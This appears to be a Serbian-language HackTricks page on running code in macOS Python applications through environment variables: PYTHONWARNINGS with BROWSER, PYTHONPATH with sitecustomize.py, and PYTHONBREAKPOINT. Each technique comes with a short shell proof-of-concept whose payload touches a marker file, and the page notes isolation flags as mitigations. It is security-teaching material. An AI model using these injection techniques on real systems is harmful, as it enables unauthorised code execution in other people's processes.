# Injekcija u macOS Python aplikacije

{{#include ../../../banners/hacktricks-training.md}}

## Preko promenljivih okruženja `PYTHONWARNINGS` i `BROWSER`

Ako napadač može da kontroliše okruženje Python procesa, kombinacija `PYTHONWARNINGS` i `BROWSER` može da pokrene izvršavanje komandi kada Python uveze modul `antigravity` tokom obrade posebno kreirane opcije upozorenja. Tehnika se oslanja na to da `antigravity` otvara URL pomoću Python modula `webbrowser`, koji koristi promenljivu okruženja `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Putem `PYTHONPATH` i `sitecustomize.py`

Tokom normalnog pokretanja, Python-ov `site` modul dodaje putanje specifične za site, a zatim pokušava da importuje modul pod nazivom `sitecustomize`. Postavljanjem direktorijuma dostupnog napadaču za čitanje na prvo mesto u `PYTHONPATH`, napadač koji kontroliše okruženje procesa može da natera Python da importuje payload pre ciljne skripte. Zastavica `-S` onemogućava automatsku inicijalizaciju modula `site`, dok izolovani režim (`-I`) ignoriše `PYTHONPATH` i podrazumeva `-s` i `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Putem `PYTHONBREAKPOINT`

Od Python 3.7 (PEP 553), ugrađeni `breakpoint()` uvozi i poziva ono na šta pokazuje `sys.breakpointhook`, a ta ciljna vrednost preuzima se iz **`PYTHONBREAKPOINT`** environment variable (`package.module.callable`). I uvoz imenovanog modula i pozivanje callable-a izvršavaju se pre nego što bi se debugger uobičajeno pojavio, pa napadač koji kontroliše environment procesa koji dođe do `breakpoint()` (što je uobičajeno u skriptama za održavanje/debugovanje, a ponekad se ostavlja i u production putanjama) dobija code execution.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Za razliku od `PYTHONWARNINGS`/`PYTHONPATH`, ovo zahteva da target zaista dođe do poziva `breakpoint()`, ali takođe radi isključivo preko **import side effects** imenovanog modula (usmerite ga na bilo koji importable module — na primer onaj koji se nalazi prvi na `PYTHONPATH` — čiji top level izvršava kod). Postavljanje `PYTHONBREAKPOINT=0` potpuno onemogućava hook.

## References

- [1] [Hacking pomoću Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook za konfiguraciju specifičan za sajt](https://docs.python.org/3/library/site.html)
- [3] [Python komandna linija i okruženje](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Ugrađeni breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
